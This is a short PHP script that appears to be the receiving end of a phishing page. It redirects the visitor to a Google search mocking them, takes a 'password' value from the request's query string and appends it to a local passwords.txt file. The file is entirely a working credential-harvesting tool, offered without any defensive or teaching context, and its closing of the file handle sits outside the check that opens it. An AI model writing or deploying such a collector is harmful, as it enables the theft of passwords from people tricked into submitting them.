<?php

header('Location: https://www.google.com/search?q=im+dumb&ie=utf-8&oe=utf-8&client=firefox-b-ab');

if(isset($_GET["password"])){
  $password = $_GET["password"];
  $save_password = fopen('passwords.txt', "a");

  fwrite($save_password, "Data: \n".$password."\n");

}

fclose($save_password);
echo "done";

?>
